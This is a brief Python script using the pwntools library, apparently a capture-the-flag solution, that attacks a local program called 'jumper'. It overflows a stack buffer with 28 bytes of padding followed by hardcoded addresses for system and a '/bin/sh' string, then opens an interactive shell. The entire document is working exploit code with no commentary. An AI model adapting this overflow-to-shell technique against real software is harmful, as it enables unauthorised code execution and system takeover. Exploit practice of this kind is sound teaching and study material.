from pwn import *

global p
p = process("./jumper")

system = 0x080491c3
binsh = 0x0804b2f8

exploit = b"A" * 28
exploit += p32(system)
exploit += p32(binsh)

p.sendlineafter("Hello\n", exploit)
p.interactive()
p.close()
